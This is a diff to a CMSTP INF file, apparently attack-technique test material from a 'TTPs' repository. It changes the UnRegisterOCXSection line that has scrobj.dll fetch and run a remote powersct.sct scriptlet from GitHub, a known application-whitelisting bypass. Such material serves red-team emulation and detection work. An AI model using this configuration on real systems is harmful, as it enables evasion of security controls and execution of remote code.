@@ -8,7 +8,7 @@ AdvancedINF=2.5
 UnRegisterOCXs=UnRegisterOCXSection
 
 [UnRegisterOCXSection]
-%11%\scrobj.dll,NI,https://gist.githubusercontent.com/NickTyrer/0604bb9d7bcfef9e0cf82c28a7b76f0f/raw/676451571c203303a95b95fcb29c8b7deb8a66e0/powersct.sct
+%11%\scrobj.dll,NI,https://raw.githubusercontent.com/vadim-hunter/TTPs/master/CMSTP/powersct.sct
 
 [Strings]
 AppAct = "SOFTWARE\Microsoft\Connection Manager"
